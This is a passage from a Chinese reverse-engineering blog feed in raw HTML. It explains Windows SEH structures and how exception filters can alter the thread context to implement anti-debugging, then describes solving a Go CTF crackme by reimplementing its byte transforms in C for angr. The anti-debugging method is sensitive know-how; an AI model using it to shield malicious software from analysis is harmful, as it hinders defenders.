class="comment">//OS内部使用</span></span><br><span class="line">    ExceptionCollidedUnwind = <span class="number">3</span>     <span class="comment">//OS内部使用</span></span><br><span class="line">&#125;EXCEPTION_DISPOSITION;</span><br></pre></td></tr></table></figure><p>这里再讲解一个我在学习的时候遇到的困惑点：</p><p>_EXCEPTION_DISPOSITION和  PEXCEPTION_ROUTINE。</p><p><em><strong>前者是一个枚举类型，是异常处理函数的返回值，后者是函数指针类型，是一个指向异常处理函数的指针。</strong></em></p><p>OK，这里，还有一个点：<em><strong>这个返回值和前面提到的过滤器的返回值不一样！！！！</strong></em></p><p>找到这个异常处理函数还涉及一个栈展开，详细讲解请移步视频。</p><p>相信看完视频，读者就已经能够理解大部分内容了。</p><h1 id="0x04-通过异常处理机制实现反调试"><a href="#0x04-通过异常处理机制实现反调试" class="headerlink" title="0x04: 通过异常处理机制实现反调试"></a>0x04: 通过异常处理机制实现反调试</h1><p>通过上面的学习，我们已经大致了解了异常处理机制的工作原理。</p><p>那么很容易就可以知道，在异常处理函数或者过滤器函数中我们可以进行一些猥琐的操作。</p><p>这里就要详细讲解一下过滤器函数和异常处理函数。</p><p>过滤器函数中的参数不仅仅有GetExceptionCode()，还有其他的可能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GetExceptionCode</span><br><span class="line">返回 (一个32位整数) 的代码，也就是异常原因相对应的异常值。</span><br><span class="line">GetExceptionInformation</span><br><span class="line">返回一个指向 EXCEPTION_POINTERS 结构的指针，该结构包含有关异常的其他信息。</span><br></pre></td></tr></table></figure><p>上面的内容来自云之君师傅的博客。</p><p>其中 EXCEPTION_POINTERS 定义如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_POINTERS</span> &#123;</span><br><span class="line">  PEXCEPTION_RECORD ExceptionRecord;</span><br><span class="line">  PCONTEXT          ContextRecord;</span><br><span class="line">&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;</span><br></pre></td></tr></table></figure><p>ExceptionRecord定义如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_RECORD</span> &#123;</span><br><span class="line">  DWORD                    ExceptionCode;<span class="comment">//异常代码</span></span><br><span class="line">  DWORD                    ExceptionFlags;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_RECORD</span> *ExceptionRecord;</span><br><span class="line">  PVOID                    ExceptionAddress;<span class="comment">//异常发生地址</span></span><br><span class="line">  DWORD                    NumberParameters;</span><br><span class="line">  ULONG_PTR                ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure><p>Context:</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CONTEXT</span> &#123;</span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line">    DWORD   Dr0;                <span class="comment">//0x04</span></span><br><span class="line">    DWORD   Dr1;                <span class="comment">//0x08</span></span><br><span class="line">    DWORD   Dr2;                <span class="comment">//0x0c</span></span><br><span class="line">    DWORD   Dr3;                <span class="comment">//0x10</span></span><br><span class="line">    DWORD   Dr6;                <span class="comment">//0x14</span></span><br><span class="line">    DWORD   Dr7;                <span class="comment">//0x18</span></span><br><span class="line"></span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line"></span><br><span class="line">    DWORD   SegGs;              <span class="comment">//0x88</span></span><br><span class="line">    DWORD   SegFs;              <span class="comment">//0x90</span></span><br><span class="line">    DWORD   SegEs;              <span class="comment">//0x94</span></span><br><span class="line">    DWORD   SegDs;              <span class="comment">//0x98</span></span><br><span class="line"></span><br><span class="line">    DWORD   Edi;                <span class="comment">//0x9c</span></span><br><span class="line">    DWORD   Esi;                <span class="comment">//0xa0</span></span><br><span class="line">    DWORD   Ebx;                <span class="comment">//0xa4</span></span><br><span class="line">    DWORD   Edx;                <span class="comment">//0xa8</span></span><br><span class="line">    DWORD   Ecx;                <span class="comment">//0xac</span></span><br><span class="line">    DWORD   Eax;                <span class="comment">//0xb0</span></span><br><span class="line">    DWORD   Ebp;                <span class="comment">//0xb4</span></span><br><span class="line">    DWORD   Eip;                <span class="comment">//0xb8</span></span><br><span class="line"></span><br><span class="line">    DWORD   SegCs;              <span class="comment">//0xbc MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">//0xc0 MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;                <span class="comment">//0xc4</span></span><br><span class="line">    DWORD   SegSs;              <span class="comment">//0xc8</span></span><br><span class="line"></span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line">&#125; CONTEXT;</span><br></pre></td></tr></table></figure><p>也就是说，在过滤器函数中是可以获得包含异常代码、异常地址、异常发生时的上下文信息等等。</p><p>因此在过滤器函数中可以对context进行更改，并返回<code>EXCEPTION_CONTINUE_EXECUTION</code></p><p>这样就可以实现反调试功能了。</p><p>而在except块中的内容，也就是异常处理函数，实际上并不是函数，只是一段代码而已，也就是说它是无法F5的。</p><p>还记得那个简陋SEH链表中的异常处理函数吗？</p><p>这个函数才是一个真正的函数。</p><p>定义如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION __cdecl _except_handler</span><br><span class="line">(</span><br><span class="line">  EXCEPTION_RECORD              *pRecord,</span><br><span class="line">  EXCEPTION_REGISTRATION_RECORD *pFrame,</span><br><span class="line">  CONTEXT                       *pContext,</span><br><span class="line">  PVOID                          pValue</span><br><span class="line">)&#123;</span><br><span class="line"><span class="comment">//···</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的前三个成员我们都已经在前面介绍过了。</p><p>很显然，在这个函数中也可以进行猥琐操作，但是如果要在这个函数中进行猥琐操作的话，就不能使用<code> __try/____except</code>关键词了，而应该使用最朴素的链表来进行操作。</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angr的一些使用</title>
      <link href="/2023/04/06/2023-04-06-%E7%94%B1%E4%B8%80%E9%81%93raffle%E5%BC%95%E5%87%BA%E7%9A%84%E6%80%9D%E8%80%83%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8Eangr%E4%BD%BF%E7%94%A8%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E6%B3%95/"/>
      <url>/2023/04/06/2023-04-06-%E7%94%B1%E4%B8%80%E9%81%93raffle%E5%BC%95%E5%87%BA%E7%9A%84%E6%80%9D%E8%80%83%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8Eangr%E4%BD%BF%E7%94%A8%E7%9A%84%E9%80%9A%E7%94%A8%E8%A7%A3%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="前言1"><a href="#前言1" class="headerlink" title="前言1"></a>前言1</h1><p>众所周知，angr有非常多的使用限制，一般的程序很难直接使用angr来进行解题。但是，虽然不能直接使用angr来进行解题，但是我们完全可以间接使用angr。一般的程序，只要知道它的加密逻辑后，我们就可以用C语言复现这个程序，保证同样的输入下，重写的程序和原程序其加密之后的结果是一样的，然后再用angr对重写的程序进行解题。</p><h1 id="这种解题方法的优势与劣势"><a href="#这种解题方法的优势与劣势" class="headerlink" title="这种解题方法的优势与劣势"></a>这种解题方法的优势与劣势</h1><h2 id="优势："><a href="#优势：" class="headerlink" title="优势："></a>优势：</h2><p>我们可以不用再完全分析出程序的加密逻辑，也不用知道加密算法的逆算法是怎么样的，我们只需要无脑重写程序的逻辑，无脑使用angr即可。</p><h2 id="劣势："><a href="#劣势：" class="headerlink" title="劣势："></a>劣势：</h2><p>这种解题方法很显然存在缺陷，很容易看到，在重写程序这一步骤，我们需要花费大量时间来保证加密逻辑与原程序是完全一致的，往往在短时间内很难一次就复现成功，这对我们的解题信心会产生很大的冲击。</p><h1 id="前言2"><a href="#前言2" class="headerlink" title="前言2"></a>前言2</h1><p>这种解题方法在之前学angr的时候就已经想过，但是奈何没有合适的题目来进行实践。前几天KM爷给了我们一道raffle，在做这道raffle的时候，想过其他的解法，一种是按照加密函数的顺序一步步逆回去，但是这个方法破产了，因为有的函数无法逆，因为在加密中进行了这样的操作：<code>main_input[3]*=54</code>，其中这个输入的数组是以字节为基本元素的，很显然无法逆回去。于是我就想到了angr。angr无疑是非常强大的，但是限制也非常多，很多时候，根本不知道angr会在哪一个库函数进去出不来了，在这道题中在angr中实现hook也非常不容易或者说非常困难。这个程序不能用angr但是我又非常想用angr，怎么办？那干脆我重写一个程序吧。重写一个和原来的程序加密逻辑一样的程序，这样再用angr跑，怎么样？</p><h1 id="分析这道题目"><a href="#分析这道题目" class="headerlink" title="分析这道题目"></a>分析这道题目</h1><p>在分析这道题目的同时，我们会学到一些go 语言逆向的知识。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( &amp;v29 &lt;= *(__readfsqword(<span class="number">0xFFFFFFF8</span>) + <span class="number">16</span>) )</span><br><span class="line">    <span class="built_in">runtime_morestack_noctxt</span>(v1);</span><br></pre></td></tr></table></figure><p>这段代码的意思是如果栈空间不够用了，那么就延长一下栈空间。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( qword_566628 &gt;= <span class="number">2</span> &amp;&amp; *(os_Args + <span class="number">24</span>) == <span class="number">45LL</span> )</span><br></pre></td></tr></table></figure><p>这个判断语句的意思是，命令行参数大于等于2，且第二个参数的字符数量等于45</p><p>这个代码就告诉了我们，这个程序时从命令行参数读取输入的。</p><p>由于笔者没有学过相关知识，无法解释这句代码，这段代码的具体实现功能是通过动态调试推测出来的。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sync___WaitGroup__Add</span>(v1, v2, v3);</span><br><span class="line">    <span class="built_in">runtime_newproc</span>(v1, v2, v4, v5, v6, v7, <span class="number">0</span>, off_4CDC68);</span><br><span class="line">    <span class="built_in">runtime_newproc</span>(v1, v2, v8, v9, v10, v11, <span class="number">0</span>, off_4CDBC0);</span><br><span class="line">    <span class="built_in">runtime_newproc</span>(v1, v2, v12, v13, v14, v15, <span class="number">0</span>, off_4CDBD0);</span><br><span class="line">    v23 = &amp;main_wg;</span><br><span class="line">    <span class="built_in">sync___WaitGroup__Wait</span>();</span><br></pre></td></tr></table></figure><p>这段代码是Go语言的代码，大致的意思是：</p><p>首先，调用了一个名为<code>sync___WaitGroup__Add</code>的函数，向<code>WaitGroup</code>中添加了三个值为<code>v1</code>、<code>v2</code>、<code>v3</code>的任务。</p><p>接着，使用<code>runtime_newproc</code>函数创建了三个新的进程来执行这三个任务。</p><p>最后，使用<code>sync___WaitGroup__Wait</code>函数等待这三个任务完成。在等待期间，程序将被阻塞，直到这三个任务全部完成为止。<code>v23</code>变量指向了一个名为<code>main_wg</code>的<code>WaitGroup</code>对象，用于同步这三个任务的完成。</p><p>上面的代码就是这个程序的关键加密代码了。</p><p>上面三个加密函数中每个函数又分别包括了三个函数，而这三个加密函数中又包括三个加密函数。</p><p>总共是39个加密函数。</p><p>通过动态调试可以知道这39个加密函数的执行顺序。</p><h1 id="用C语言重写程序"><a href="#用C语言重写程序" class="headerlink" title="用C语言重写程序"></a>用C语言重写程序</h1><p>源代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> d[]=&#123; <span class="comment">//密文</span></span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0x3E</span>, <span class="number">0xBA</span>, <span class="number">0x05</span>, <span class="number">0x43</span>, <span class="number">0xC8</span>, <span class="number">0x13</span>, <span class="number">0xE2</span>, <span class="number">0xDC</span>, <span class="number">0x5D</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0xF2</span>, <span class="number">0x99</span>, <span class="number">0x2F</span>, <span class="number">0xA3</span>, <span class="number">0xB2</span>, <span class="number">0x43</span>, <span class="number">0xFD</span>, <span class="number">0x4F</span>, <span class="number">0x60</span>, </span><br><span class="line">  <span class="number">0x9D</span>, <span class="number">0x71</span>, <span class="number">0x9B</span>, <span class="number">0x0C</span>, <span class="number">0xDE</span>, <span class="number">0x98</span>, <span class="number">0xA2</span>, <span class="number">0x23</span>, <span class="number">0xCB</span>, <span class="number">0x7D</span>, </span><br><span class="line">  <span class="number">0x80</span>, <span class="number">0xC1</span>, <span class="number">0xD3</span>, <span class="number">0x1E</span>, <span class="number">0x45</span>, <span class="number">0x90</span>, <span class="number">0x5D</span>, <span class="number">0xA8</span>, <span class="number">0xE0</span>, <span class="number">0x72</span>, </span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0x2F</span>, <span class="number">0x13</span>, <span class="number">0xA3</span>, <span class="number">0xDD</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> k[<span class="number">46</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_29</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">6</span>]^=k[<span class="number">17</span>];</span><br><span class="line">k[<span class="number">23</span>]^=k[<span class="number">10</span>];</span><br><span class="line">k[<span class="number">27</span>]^=k[<span class="number">41</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_31</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">26</span>]+=<span class="number">51</span>;</span><br><span class="line">k[<span class="number">13</span>]^=k[<span class="number">44</span>];</span><br><span class="line">k[<span class="number">8</span>]-=<span class="number">105</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_28</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">10</span>]+=<span class="number">14</span>;</span><br><span class="line">k[<span class="number">38</span>]*=<span class="number">49</span>;</span><br><span class="line">k[<span class="number">0x29</span>]^=k[<span class="number">0x2B</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_1</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">39</span>]+=<span class="number">26</span>;</span><br><span class="line">k[<span class="number">14</span>]+=<span class="number">78</span>;</span><br><span class="line">k[<span class="number">8</span>]^=k[<span class="number">11</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_2</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">36</span>]-=<span class="number">66</span>;</span><br><span class="line">k[<span class="number">35</span>]+=<span class="number">12</span>; </span><br><span class="line">k[<span class="number">16</span>]*=<span class="number">87</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_3</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">7</span>]^=k[<span class="number">19</span>];</span><br><span class="line">k[<span class="number">6</span>]*=<span class="number">27</span>;</span><br><span class="line">k[<span class="number">13</span>]-=<span class="number">40</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_4</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">21</span>]*=<span class="number">9</span>;</span><br><span class="line">k[<span class="number">25</span>]*=<span class="number">-91</span>;</span><br><span class="line">k[<span class="number">41</span>]+=<span class="number">45</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_5</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">9</span>]^=k[<span class="number">0</span>];</span><br><span class="line">k[<span class="number">44</span>]*=<span class="number">29</span>;</span><br><span class="line">k[<span class="number">10</span>]*=<span class="number">-47</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_6</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">20</span>]*=<span class="number">-9</span>;</span><br><span class="line">k[<span class="number">5</span>]-=<span class="number">75</span>;</span><br><span class="line">k[<span class="number">1</span>]^=k[<span class="number">44</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_33</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">9</span>]-=<span class="number">35</span>;</span><br><span class="line">k[<span class="number">20</span>]+=<span class="number">122</span>;</span><br><span class="line">k[<span class="number">29</span>]*=<span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_34</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">34</span>]^=k[<span class="number">19</span>];</span><br><span class="line">k[<span class="number">28</span>]*=<span class="number">101</span>;</span><br><span class="line">k[<span class="number">37</span>]*=<span class="number">61</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_20</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">28</span>]^=k[<span class="number">26</span>];</span><br><span class="line">k[<span class="number">16</span>]^=k[<span class="number">6</span>];</span><br><span class="line">k[<span class="number">3</span>]-=<span class="number">29</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_7</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">22</span>]*=<span class="number">87</span>;</span><br><span class="line">k[<span class="number">33</span>]-=<span class="number">57</span>;</span><br><span class="line">k[<span class="number">16</span>]-=<span class="number">69</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_8</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">13</span>]-=<span class="number">51</span>;</span><br><span class="line">k[<span class="number">33</span>]-=<span class="number">119</span>;</span><br><span class="line">k[<span class="number">31</span>]^=k[<span class="number">18</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_39</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">33</span>]*=<span class="number">33</span>;</span><br><span class="line">k[<span class="number">21</span>]+=<span class="number">103</span>;</span><br><span class="line">k[<span class="number">7</span>]*=<span class="number">-77</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_15</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">22</span>]^=k[<span class="number">5</span>];</span><br><span class="line">k[<span class="number">21</span>]^=k[<span class="number">4</span>];</span><br><span class="line">k[<span class="number">14</span>]*=<span class="number">-47</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_14</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">17</span>]*=<span class="number">29</span>;</span><br><span class="line">k[<span class="number">44</span>]^=k[<span class="number">19</span>];</span><br><span class="line">k[<span class="number">27</span>]^=k[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_9</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">40</span>]*=<span class="number">109</span>;</span><br><span class="line">k[<span class="number">32</span>]-=<span class="number">3</span>;</span><br><span class="line">k[<span class="number">35</span>]^=k[<span class="number">42</span>];</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_10</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">0</span>]+=<span class="number">12</span>;</span><br><span class="line">k[<span class="number">10</span>]-=<span class="number">118</span>;</span><br><span class="line">k[<span class="number">19</span>]*=<span class="number">103</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_11</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">30</span>]+=<span class="number">83</span>;</span><br><span class="line">k[<span class="number">11</span>]^=k[<span class="number">41</span>];</span><br><span class="line">k[<span class="number">38</span>]^=k[<span class="number">22</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_12</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">6</span>]-=<span class="number">87</span>;</span><br><span class="line">k[<span class="number">0</span>]^=k[<span class="number">33</span>];</span><br><span class="line">k[<span class="number">15</span>]^=k[<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_30</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">0</span>]*=<span class="number">-53</span>;</span><br><span class="line">k[<span class="number">40</span>]^=k[<span class="number">0</span>];</span><br><span class="line">k[<span class="number">18</span>]+=<span class="number">79</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_24</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">5</span>]-=<span class="number">111</span>;</span><br><span class="line">k[<span class="number">42</span>]-=<span class="number">65</span>;</span><br><span class="line">k[<span class="number">1</span>]*=<span class="number">91</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_22</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">36</span>]^=k[<span class="number">1</span>];</span><br><span class="line">k[<span class="number">24</span>]+=<span class="number">36</span>;</span><br><span class="line">k[<span class="number">2</span>]-=<span class="number">118</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_18</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">38</span>]*=<span class="number">35</span>;</span><br><span class="line">k[<span class="number">8</span>]*=<span class="number">-71</span>;</span><br><span class="line">k[<span class="number">22</span>]-=<span class="number">48</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_37</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">30</span>]^=k[<span class="number">11</span>];</span><br><span class="line">k[<span class="number">5</span>]*=<span class="number">-29</span>;</span><br><span class="line">k[<span class="number">19</span>]+=<span class="number">58</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_21</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">3</span>]^=k[<span class="number">0</span>];</span><br><span class="line">k[<span class="number">14</span>]^=k[<span class="number">29</span>];</span><br><span class="line">k[<span class="number">7</span>]+=<span class="number">39</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_25</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">31</span>]*=<span class="number">-29</span>;</span><br><span class="line">k[<span class="number">2</span>]^=k[<span class="number">26</span>];</span><br><span class="line">k[<span class="number">37</span>]^=k[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_13</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">1</span>]-=<span class="number">108</span>;</span><br><span class="line">k[<span class="number">42</span>]*=<span class="number">125</span>;</span><br><span class="line">k[<span class="number">26</span>]*=<span class="number">-15</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_16</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">5</span>]+=<span class="number">67</span>;</span><br><span class="line">k[<span class="number">42</span>]^=k[<span class="number">4</span>];</span><br><span class="line">k[<span class="number">30</span>]*=<span class="number">85</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_26</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">5</span>]-=<span class="number">71</span>;</span><br><span class="line">k[<span class="number">32</span>]*=<span class="number">-51</span>;</span><br><span class="line">k[<span class="number">3</span>]*=<span class="number">85</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_27</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">28</span>]^=k[<span class="number">6</span>];</span><br><span class="line">k[<span class="number">31</span>]+=<span class="number">29</span>;</span><br><span class="line">k[<span class="number">5</span>]^=k[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_23</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">34</span>]+=<span class="number">78</span>;</span><br><span class="line">k[<span class="number">20</span>]^=k[<span class="number">8</span>];</span><br><span class="line">k[<span class="number">38</span>]+=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_35</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">42</span>]-=<span class="number">88</span>;</span><br><span class="line">k[<span class="number">31</span>]+=<span class="number">13</span>;</span><br><span class="line">k[<span class="number">12</span>]*=<span class="number">119</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_19</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">36</span>]*=<span class="number">21</span>;</span><br><span class="line">k[<span class="number">43</span>]^=k[<span class="number">35</span>];</span><br><span class="line">k[<span class="number">40</span>]+=<span class="number">120</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_32</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">12</span>]^=k[<span class="number">35</span>];</span><br><span class="line">k[<span class="number">34</span>]*=<span class="number">99</span>;</span><br><span class="line">k[<span class="number">18</span>]^=k[<span class="number">19</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_17</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">27</span>]*=<span class="number">11</span>;</span><br><span class="line">k[<span class="number">24</span>]*=<span class="number">-81</span>;</span><br><span class="line">k[<span class="number">25</span>]^=k[<span class="number">19</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_36</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">4</span>]^=k[<span class="number">20</span>];</span><br><span class="line">k[<span class="number">4</span>]*=<span class="number">-101</span>;</span><br><span class="line">k[<span class="number">25</span>]-=<span class="number">104</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sub_38</span><span class="params">()</span>&#123;</span><br><span class="line">k[<span class="number">39</span>]^=k[<span class="number">36</span>];</span><br><span class="line">k[<span class="number">9</span>]*=<span class="number">-35</span>;</span><br><span class="line">k[<span class="number">11</span>]^=k[<span class="number">24</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;k);</span><br><span class="line">sub_17();</span><br><span class="line">sub_26();</span><br><span class="line">sub_16();</span><br><span class="line">sub_38();</span><br><span class="line">sub_7();</span><br><span class="line">sub_33();</span><br><span class="line">sub_13();</span><br><span class="line">sub_1();</span><br><span class="line">sub_28();</span><br><span class="line">sub_32();</span><br><span class="line"></span><br><span class="line">sub_5();</span><br><span class="line">sub_23();</span><br><span class="line">sub_27();</span><br><span class="line">sub_12();</span><br><span class="line">sub_2();</span><br><span class="line">sub_36();</span><br><span class="line">sub_4();</span><br><span class="line">sub_9();</span><br><span class="line">sub_39();</span><br><span class="line">sub_20();</span><br><span class="line"></span><br><span class="line">sub_34();</span><br><span class="line">sub_25();</span><br><span class="line">sub_37();</span><br><span class="line">sub_18();</span><br><span class="line">sub_30();</span><br><span class="line">sub_29();</span><br><span class="line">sub_31();</span><br><span class="line">sub_19();</span><br><span class="line">sub_35();</span><br><span class="line">sub_10();</span><br><span class="line"></span><br><span class="line">sub_3();</span><br><span class="line">sub_11();</span><br><span class="line">sub_8();</span><br><span class="line">sub_14();</span><br><span class="line">sub_15();</span><br><span class="line">sub_6();</span><br><span class="line">sub_21();</span><br><span class="line">sub_22();</span><br><span class="line">sub_24();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">for(int i=0;i&lt;4;i++)&#123;</span></span><br><span class="line"><span class="comment">for(int j=0;j&lt;10;j++)&#123;</span></span><br><span class="line"><span class="comment">printf(&quot;0x%x &quot;,k[i*10+j]);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">for(int i=40;i&lt;45;i++)&#123;</span></span><br><span class="line"><span class="comment">printf(&quot;0x%x &quot;,k[i]);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line">d[<span class="number">0</span>]==k[<span class="number">0</span>]&amp;&amp;d[<span class="number">1</span>]==k[<span 